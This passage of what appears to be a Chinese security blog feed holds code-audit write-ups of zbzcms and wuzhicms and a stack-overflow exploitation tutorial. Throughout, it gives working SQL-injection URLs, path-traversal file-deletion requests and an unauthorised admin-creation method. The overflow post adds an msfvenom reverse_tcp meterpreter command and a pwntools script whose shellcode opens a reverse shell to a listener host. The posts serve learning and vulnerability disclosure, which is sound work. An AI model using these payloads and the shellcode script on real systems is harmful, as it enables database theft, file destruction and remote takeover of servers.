alt="59"></p><p>这里延续上面的文件上传3的 upload文件</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/60.png" alt="60"></p><p>这里存在if else判断 没进入上传的条件的话 就执行下面的删除操作<br>也是没有任何过滤 直接通过传参del跟上路径 直接任意删除 我们先在目录下创建一个1.txt</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/61.png" alt="61"></p><p>在上一级目录下创建 然后我们构造payload 删除<br><a href="http://192.168.1.7/zbzcms.com/cms/cms/include/upload.php?del=../1.txt">http://192.168.1.7/zbzcms.com/cms/cms/include/upload.php?del=../1.txt</a></p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/62.png" alt="62"></p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/63.png" alt="63"></p><p>也是成功删除</p><h3 id="第八处-未授权添加管理员"><a href="#第八处-未授权添加管理员" class="headerlink" title="第八处 未授权添加管理员"></a>第八处 未授权添加管理员</h3><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/64.png" alt="64"></p><p>问题出现在这个文件 这个文件夹前面我们也分析过 这里漏了一个管理员添加<br>也是直接构造run参数 未授权添加</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/65.png" alt="65"></p><p>然后查看数据库</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/66.png" alt="66"></p><p>但是发现这个时候 是没有等级的 相当于权限 也就等不进去</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/67.png" alt="67"></p><p>但是这个文件前面有一个判断是判断是否登录的</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/68.png" alt="68"></p><p>我们先通过login 来得到session<br>直接构造</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/69.png" alt="69"></p><p>注意 这里是pwd</p><p>执行之后</p><p>然后将这个路径<a href="http://192.168.1.7/zbzcms.com/cms/cms/admin/%E5%A4%8D%E5%88%B6%E5%88%B0">http://192.168.1.7/zbzcms.com/cms/cms/admin/复制到</a> url<br>回车即可</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/70.png" alt="70"></p><p>还有一种方式</p><p>在添加管理员的时候 把等级参数 填上</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/71.png" alt="71"></p><p>然后查看数据库</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/72.png" alt="72"></p><p>刚添加的abc 权限为1<br>直接登录</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/73.png" alt="73"></p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>如果有什么说的不好的地方请师傅们指出~</p><p>联系方式关于页面</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wuzhicms审计</title>
    <link href="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/"/>
    <url>/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<p> 文章首发于奇安信社区：<a href="https://forum.butian.net/share/1126">https://forum.butian.net/share/1126</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在网上漫游发现的一个cms cnvd也是有提交的<br>也是初次审计这种<br>官网：<a href="https://www.wuzhicms.com/">https://www.wuzhicms.com/</a><br>现在也已经好像没更新了</p><p>也是先看了一会代码 才知道这是MVC的 之前由于也没有了解过MVC 就很懵<br>开始啥都没看懂<br>后来经过百度 和 求助了一波团队的时候 总算是有一点点明白了 能把代码走动<br>MVC全名是Model View Controller，是模型(model)－视图(view)－控制器(controller)的缩写，一种软件设计典范，用一种业务逻辑、数据、界面显示分离的方法组织代码，将业务逻辑聚集到一个部件里面，在改进和个性化定制界面及用户交互的同时，不需要重新编写业务逻辑。MVC被独特的发展起来用于映射传统的输入、处理和输出功能在一个逻辑的图形化用户界面的结构中。(百度的)</p><p>而在之后的路径中会看见m f v这几个参数<br>m就是文件夹 f就是文件 v就是方法<br>就先大概介绍这些<br>下面开始审计<br>sql注入肯定是容易找的 就先找sql注入了</p><h3 id="工具：seay-phpstorm-phpstudy"><a href="#工具：seay-phpstorm-phpstudy" class="headerlink" title="工具：seay phpstorm phpstudy"></a>工具：seay phpstorm phpstudy</h3><h3 id="第一处-sql注入-可惜是后台的"><a href="#第一处-sql注入-可惜是后台的" class="headerlink" title="第一处 sql注入(可惜是后台的)"></a>第一处 sql注入(可惜是后台的)</h3><p>先直接全局搜索select</p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/1.png" alt="1"></p><p>这个函数 展示没有发现有过滤<br>然后找哪里调用了这个函数</p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/2.png" alt="2"></p><p>通过全局搜索 在这个地方 发现调用了这个函数<br>然后查看传递的参数<br>主要传递的是55行这个$where参数 传到了函数<br>然后我们看$where参数的组成 里面有两个变量$siteid $keywords<br>我们是可能可控的<br>先看$keywords 因为这个没调用函数 但是调用了一个$GLOBALS来获取值<br>这里就又要介绍下$GLOBALS 因为刚开始我也没懂这个是怎么用来获取值的 知道我百度一阵之后<br>和代码翻翻之后 在一个文件中发现了</p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/3.png" alt="3"></p><p>这个cms用$GLOBALS来获取全部的变量 直接把GET POST代替了<br>具体怎么代替的就不跟进解释了 一句话 就是$GLOBALS可以取到get post的传的值<br>那么这个keywords 前面又没有定义变量啥的 大概率是 传参的 (后面经过验证 也的确如此)<br>那另一个参数就不用看了 就先控制这个参数才进行注入了<br>有了可控参数 现在就需要找到整个payload了<br>可能熟悉MVC的师傅 就知道该怎么构造payload了 但我没学过MVC 也不了解 就只能用其他方式来找了</p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/4.png" alt="4"></p><p>在这个文件看见了广告管理的注释<br>那我就去后台找这个功能了</p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/5.png" alt="5"></p><p>又因为调用的函数是search嘛 那就是这个搜索框 八九不离十了<br>直接输入1 然后搜索 但是这样看不出来<br>就输入1然后抓包 看看包了</p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/6.png" alt="6"></p><p>好了 这样路径参数什么的也出来了<br>就全部复制到url<br>然后构造</p><blockquote><p>payload ：SELECT COUNT(*) AS num FROM <code>wz_promote_place</code> WHERE <code>siteid</code>=’1’ AND <code>name</code> LIKE ‘%1%’ or extractvalue(1,concat(0x7e,(select database())))%23</p></blockquote><p>闭合%‘%23<br>这里我尝试了下 盲注 和报错都是可以的</p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/7.png" alt="7"></p><p>如果现在到过头来看 就一个简单的搜索框的注入没什么花里胡哨的 过滤也没 但审计来看 还是绕了一大圈子</p><h3 id="第二处-前台sql注入"><a href="#第二处-前台sql注入" class="headerlink" title="第二处 前台sql注入"></a>第二处 前台sql注入</h3><p>还是在搜索select的时候 发现在mysql.class文件下有一个函数里面有select 并且后面的拼接也没有任何的过滤</p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/8.png" alt="8"></p><p>然后我们搜索哪里调用了这个函数<br>首先是在api目录下的sms_check文件中发现调用了get_one函数 并且参数是通过前面的$code拼接</p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/9.png" alt="9"></p><p>我们可以看到code 先是通过$GLOBALS来获取参数param的值 从前面的介绍可以知道 $GLOBALS是可以获取post get的值 这个文件前面没有定义param变量 那么 这个param应该就是post 或者get 就是我们可控的 这也是导致注入的点</p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/10.png" alt="10"></p><p>code还通过strip_tags() 函数 而这个函数的作用是剥去html标签 应该是过滤xss吧大概<br>之后就直接传入了函数 继续更进函数 因为这个文件前面还引入了db类</p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/11.png" alt="11"></p><p>这个函数应该是调用的这个文件里面的<br>来到这个文件</p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/12.png" alt="12"></p><p>可以看到这个get-one函数里面 还调用了一个array2sql函数来处理$where<br>那先来看看这个函数的作用</p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/13.png" alt="13"></p><p>可以看到这个函数是用来过滤的<br>如果是数组 这进入if 把括号 单引号这些过滤掉<br>不是则走else 过滤 %20 %27<br>然后返回参数<br>但也就是这个过滤的地方 没有防护到位<br>我们传的参数不是数组 所以就没有走if<br>而else里面过滤的却是 %20 %27<br>我们传参的时候尽管是经过url编码的 但是web服务器会自动解码一次 所以 我们传到后端代码处的时候是没有进行url编码 相当于<br>但是二次编码的就不一样了 因为web服务器只解码一次<br>如果是二次编码这里的else过滤就起效果</p><p>return 调用的get_one 则是最开始看见的mysql.class文件里面了</p><p>下面就可以开始直接构造payload了 这里通过代码分析可以看到是单引号闭合</p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/14.png" alt="14"></p><p>单引号报错<br>闭合显示正常页面</p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/15.png" alt="15"></p><p>就进行盲注<br>我用的报错</p><blockquote><p>payload：[<a href="http://192.168.1.7/wuzhicms/api/sms_check.php?param=1%27+or%20extractvalue(1,concat(0x7e,(select%20database())))%23%5D">http://192.168.1.7/wuzhicms/api/sms_check.php?param=1%27+or%20extractvalue(1,concat(0x7e,(select%20database())))%23]</a>(<a href="http://192.168.1.7/wuzhicms/api/sms_check.php?param=1&#39;+or">http://192.168.1.7/wuzhicms/api/sms_check.php?param=1&#39;+or</a> extractvalue(1,concat(0x7e,(select database())))%23)</p></blockquote><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/16.png" alt="16"></p><h3 id="第三处-后台sql注入"><a href="#第三处-后台sql注入" class="headerlink" title="第三处 后台sql注入"></a>第三处 后台sql注入</h3><p>从前面两个分析 我发现的注入的地方就存在两个函数中get_list get_one<br>然后直接全局搜索这两个函数 看看什么地方调用</p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/17.png" alt="17"></p><p>可以看到 在copyfrom.php中listing函数下调用了这个函数<br>然后我们网上分析 看看什么是可控的<br>主要传进去的就一个$where 和 $page</p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/18.png" alt="18"></p><p>可以看到page会被intval()函数 转化为整数 所以我们不考虑它<br>我们看看where 在if内部 想要进入if 就需要通过GLOBALS获取到keywords<br>相当于就要传参嘛<br>然后在看里面 就没有过滤这些 直接拼接<br>这里也可以看出 闭合方式是百分号单引号 %’</p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/19.png" alt="19"></p><p>我们在来到mysql文件中定义的这个函数 也可以看到 是对where没有过滤处理的<br>那么 有了前面的基础 直接来构造</p><blockquote><p>payload：<a href="http://192.168.1.7/wuzhicms/index.php?m=core&f=copyfrom&v=listing&_su=wuzhicms&keywords=%27">http://192.168.1.7/wuzhicms/index.php?m=core&amp;f=copyfrom&amp;v=listing&amp;_su=wuzhicms&amp;keywords=%27</a></p></blockquote><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/20.png" alt="20"></p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/21.png" alt="21"></p><p>报错了 直接插入报错注入的</p><blockquote><p>payload:<a href="http://192.168.1.7/wuzhicms/index.php?m=core&amp;f=copyfrom&amp;v=listing&amp;_su=wuzhicms&amp;keywords=1%25%2527%20or%20extractvalue(1,concat(0x7e,(select%20database())))%23">http://192.168.1.7/wuzhicms/index.php?m=core&amp;f=copyfrom&amp;v=listing&amp;_su=wuzhicms&amp;keywords=1%%27%20or%20extractvalue(1,concat(0x7e,(select%20database())))%23</a></p></blockquote><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/22.png" alt="22"></p><h3 id="第四处-后台任意文件删除"><a href="#第四处-后台任意文件删除" class="headerlink" title="第四处 后台任意文件删除"></a>第四处 后台任意文件删除</h3><p>通过全局搜索unlink函数 来找文件删除</p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/23.png" alt="23"></p><p>在这个文件下找到一个删除文件的函数 然后我们继续找哪里调用了这个函数</p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/24.png" alt="24"></p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/25.png" alt="25"></p><p>还是在这个文件 找到了一个del函数 里面调用了删除文件的函数</p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/26.png" alt="26"></p><p>然后来分析调用的过程 调用删除的时候通过把$path和ATTACHMENT_ROOT 拼接<br>而ATTACHMENT_ROOT是前面定义的一个默认路径</p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/27.png" alt="27"></p><p>path则是前面的$url 来的<br>在看前面的if 如果path有值则进入到if里面 然后经过的数据库的get_one查询操作 应该这里是要查出一个东西<br>但是因为我数据库是空的 则进入的是第一个if里面 哪怕是查出1条 也是可以的<br>这里也没有其他过滤<br>然后网上看url的来源</p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/28.png" alt="28"></p><p>GLOBALS 那就可以直接通过传参的 前面也介绍了 id为空的话 也就进入到了else里面</p><p>到这里也就可以构造payload了<br>先在根目录下创建一个文件</p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/29.png" alt="29"></p><p>然后构造</p><blockquote><p><a href="http://192.168.1.7/wuzhicms/index.php?m=attachment&amp;f=index&amp;v=del&amp;_su=wuzhicms&amp;url=../1.txt">http://192.168.1.7/wuzhicms/index.php?m=attachment&amp;f=index&amp;v=del&amp;_su=wuzhicms&amp;url=../1.txt</a></p></blockquote><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/30.png" alt="30"></p><p>这里我把最终删除的路径 打印了出来</p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/31.png" alt="31"></p><p>文件也是成功删除</p><h3 id="第五处-后台任意文件上传"><a href="#第五处-后台任意文件上传" class="headerlink" title="第五处 后台任意文件上传"></a>第五处 后台任意文件上传</h3><p>直接搜索file_put_contents函数</p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/32.png" alt="32"></p><p>在set_cache函数下发现写入文件的函数 $data并且没有过滤是直接通过参数传过来的<br>然后全局搜索 在哪里调用了这个函数</p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/33.png" alt="33"></p><p>这个set函数下调用了这个函数<br>并且写入文件的内容是可控的<br>通过打印 知道了 写入的路径 文件名</p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/34.png" alt="34"></p><p>并且这里也没有过滤<br>直接构造payload</p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/35.png" alt="35"></p><p>然后访问文件</p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/36.png" alt="36"></p><p>后面又发现一个函数调用的set_cache</p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/37.png" alt="37"></p><p>过程是一样的 基本上 就没有演示了</p><p>这里还要注意一点 这里是写入的缓存文件 不是一直存在的 我重启之后 写入的内容就还原了<br>应该是还有的 就没有继续找这个了</p><h3 id="第六处-信息泄露"><a href="#第六处-信息泄露" class="headerlink" title="第六处 信息泄露"></a>第六处 信息泄露</h3><p>最后在后台页面发现一出phpinfo</p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/38.png" alt="38"></p><p><img src="/2022/02/10/wuzhicms%E5%AE%A1%E8%AE%A1/39.png" alt="39"></p><p>一个垃圾的信息泄露</p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>肯定还有审漏的<br>经过这个cms的审计过后 对MVC这种框架的也有了基本的认识了 以后遇到也不至于这样的无厘头 不知道怎么搞路由 怎么调用的<br>有了一个新的开始<br>如果此文有什么不对点 师傅们指出 学习学习 这也是继前面几篇之后新的一次尝试把 但回过头来看这个cms 也就因为mvc 所以调用的时候不同 其他的点 漏洞的地方还是规规矩矩 大差不差的和以前的比较的话</p><p>联系方式看关于页面</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>溢出提权上线</title>
    <link href="/2022/02/10/%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83%E4%B8%8A%E7%BA%BF/"/>
    <url>/2022/02/10/%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83%E4%B8%8A%E7%BA%BF/</url>
    
    <content type="html"><![CDATA[<p>文章首发于火线：<a href="https://zone.huoxian.cn/d/858">https://zone.huoxian.cn/d/858</a></p><p>初次尝试出 也算是溢出的一次学习 望师傅们指点</p><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>测试程序server.exe<br>这个程序启动的时候会监听31337端口<br>连接这个端口后 可以输入内容 然后会输出hello xxx！</p><p><img src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-01-23/1642955380-245279-image.png" alt="img"></p><p>用kali先生成测试字符</p><blockquote><p>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000</p></blockquote><p><img src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-01-23/1642955404-873858-image.png" alt="img"></p><blockquote><p>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B</p></blockquote><p>将生成的字符序列发送到server.exe监听的端口<br>先监听端口</p><blockquote><p>telnet 10.150.127.36 31337</p></blockquote><p>怎么找到监听的端口 先看看服务的进程</p><p><img src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-01-23/1642955454-389238-image.png" alt="img"></p><p>然后netstat -ano | findstr “pid”</p><p><img src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-01-23/1642955463-116232-image.png" alt="img"></p><p>这里我们用的nc测试</p><p><img src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-01-23/1642955471-793038-image.png" alt="img"></p><p>这个时候程序就被破坏了</p><p><img src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-01-23/1642955479-426832-image.png" alt="img"></p><p>然后我们来到windows的日志查看 来看看报错的偏移位置 0x39654138</p><p><img src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-01-23/1642955488-236640-image.png" alt="img"></p><p>然后用010editor看看偏移的位置 这里需要先将传进去的字符串复制到txt</p><p><img src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-01-23/1642955504-678580-image.png" alt="img"></p><p><img src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-01-23/1642955518-396915-image.png" alt="img"></p><p>然后在里面来寻找偏移的位置0x39654138</p><p><img src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-01-23/1642955527-441909-image.png" alt="img"></p><p>找到了错误的便宜位置 就将这里替换为jmp esp</p><p><img src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-01-23/1642955534-882405-image.png" alt="img"></p><p>随便选择一个 75172273</p><p><img src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-01-23/1642955542-760047-image.png" alt="img"></p><p>然后将后面的替换为shellcode 先用kali生成一段shellcode</p><p><img src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-01-23/1642955550-398713-image.png" alt="img"></p><p>然后复制到刚才的txt</p><p><img src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-01-23/1642955557-666387-image.png" alt="img"></p><p>然后保存 将文件复制到kali 然后用nc 传进去<br>先把程序运行起来</p><p><img src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-01-23/1642955584-877150-image.png" alt="img"></p><p>这里报错了 因为我是用的txt来写入 写入的不上二进制字符 应该是这样报错了</p><p>然后重新用脚本输入<br>先生成一段py格式的shellcode</p><p><img src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-01-23/1642955596-120662-image.png" alt="img"></p><blockquote><p><strong>命令：msfvenom -p windows/meterpreter/reverse_tcp lhost=10.150.127.130 lport=6688 -b “\x00\x0a\x0d” -f python</strong> </p></blockquote><p>然后写脚本</p><blockquote><p><code>from pwn import * import sys if len(sys.argv) &lt; 3: print &quot;Usage:() ip port&quot;.format(sys.argv[0])    sys.exit() ip = sys.argv[1] port = sys.argv[2] buf =  b&quot;&quot;buf += b&quot;\xda\xd3\xd9\x74\x24\xf4\xb8\x34\x4d\x02\xd0\x5a\x33&quot;buf += b&quot;\xc9\xb1\x59\x31\x42\x19\x83\xc2\x04\x03\x42\x15\xd6&quot;buf += b&quot;\xb8\xfe\x38\x99\x43\xff\xb8\xc5\x72\x2d\xdc\x8e\x27&quot;buf += b&quot;\xe1\x96\xc2\xcb\x8a\xfb\xf6\x5a\x69\x70\x84\x74\x7d&quot;buf += b&quot;\x30\x22\xa3\xb0\xc1\x83\x6b\x1e\x01\x82\x17\x5d\x56&quot;buf += b&quot;\x64\x29\xae\xab\x65\x6e\x78\xc1\x8a\x22\x2c\xa2\x06&quot;buf += b&quot;\xd3\x59\xf6\x9a\xd2\x8d\x7c\xa2\xac\xa8\x43\x56\x01&quot;buf += b&quot;\xb2\x93\xc6\x12\xec\x33\xe7\xf7\x86\x7c\xff\x72\x51&quot;buf += b&quot;\x08\xc3\x35\xe9\xc5\xb0\xf7\x12\x24\x10\xc6\x2c\xe6&quot;buf += b&quot;\x53\x24\x01\xe8\xac\x0f\xb9\x9e\xc6\x73\x44\x99\x1d&quot;buf += b&quot;\x09\x92\x2c\x81\xa9\x51\x96\x65\x4b\xb5\x41\xee\x47&quot;buf += b&quot;\x72\x05\xa8\x4b\x85\xca\xc3\x70\x0e\xed\x03\xf1\x54&quot;buf += b&quot;\xca\x87\x59\x0e\x73\x9e\x07\xe1\x8c\xc0\xe0\x5e\x29&quot;buf += b&quot;\x8b\x03\x88\x4d\x74\xdc\xb5\x13\xe2\x10\x78\xac\xf2&quot;buf += b&quot;\x3e\x0b\xdf\xc0\xe1\xa7\x77\x68\x69\x6e\x8f\xf9\x7d&quot;buf += b&quot;\x91\x5f\x41\xed\x6f\x60\xb1\x27\xb4\x34\xe1\x5f\x1d&quot;buf += b&quot;\x35\x6a\xa0\xa2\xe0\x06\xaa\x34\x01\x40\xd5\x46\x7d&quot;buf += b&quot;\x6e\x2a\x5d\x5e\xe7\xcc\x31\xce\xa7\x40\xf2\xbe\x07&quot;buf += b&quot;\x31\x9a\xd4\x88\x6e\xba\xd6\x43\x07\x51\x39\x3d\x7f&quot;buf += b&quot;\xce\xa0\x64\x0b\x6f\x2c\xb3\x71\xaf\xa6\x31\x85\x7e&quot;buf += b&quot;\x4f\x30\x95\x97\x28\xba\x65\x68\xdd\xba\x0f\x6c\x77&quot;buf += b&quot;\xed\xa7\x6e\xae\xd9\x67\x90\x85\x5a\x6f\x6e\x58\x6a&quot;buf += b&quot;\x1b\x59\xce\xd2\x73\xa6\x1e\xd2\x83\xf0\x74\xd2\xeb&quot;buf += b&quot;\xa4\x2c\x81\x0e\xab\xf8\xb6\x82\x3e\x03\xee\x77\xe8&quot;buf += b&quot;\x6b\x0c\xa1\xde\x33\xef\x84\x5c\x33\x0f\x5a\x4b\x9c&quot;buf += b&quot;\x67\xa4\xcb\x1c\x77\xce\xcb\x4c\x1f\x05\xe3\x63\xef&quot;buf += b&quot;\xe6\x2e\x2c\x67\x6c\xbf\x9e\x16\x71\xea\x7f\x86\x72&quot;buf += b&quot;\x19\xa4\x39\x08\x52\x5b\xba\xed\x7a\x38\xbb\xed\x82&quot;buf += b&quot;\x3e\x80\x3b\xbb\x34\xc7\xff\xf8\x47\x72\x5d\xa8\xcd&quot;buf += b&quot;\x7c\xf1\xaa\xc7&quot;payload = b&quot;A&quot;*146+b&quot;\xEB\x3C\xA5\x74&quot;+b&quot;\x90&quot;*10+buf r = remote(ip,port) r.sendline(payload)</code></p></blockquote><p>这里是146的原因是偏移了多少个字符 这里可以数出来</p><p><img src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-01-23/1642955614-331817-image.png" alt="img"></p><p>EB前面有146个字节</p><p><img src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-01-23/1642955623-43879-image.png" alt="img"></p><p>然后将脚本复制到kali<br>然后运行程序<br>执行py 在执行py前开启监听</p><p><img src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-01-23/1642955636-551399-image.png" alt="img"></p><p>执行脚本后</p><p><img src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-01-23/1642955644-90806-image.png" alt="img"></p><p><img src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-01-23/1642955650-42971-image.png" alt="img"></p><p>成功收到会话 溢出成功<br>下面来解决开始的错误 将刚开始生成的c的shellcode直接替换生成的python shellcode<br>看看能不能弹shell</p><p><img src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-01-23/1642955657-463695-image.png" alt="img"></p><p>发现直接报错<br>后面发现是py3 bytes和str不能直接加然后修改了下shellcode</p><p><img src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-01-23/1642955674-476965-image.png" alt="img"></p><p>前面加上了b 就可以了</p><p><img src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-01-23/1642955689-970879-image.png" alt="img"></p><p>会话成功弹回来<br>参考：<a href="https://blog.csdn.net/l1028386804/article/details/86494568">https://blog.csdn.net/l1028386804/article/details/86494568</a></p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编</tag>
      
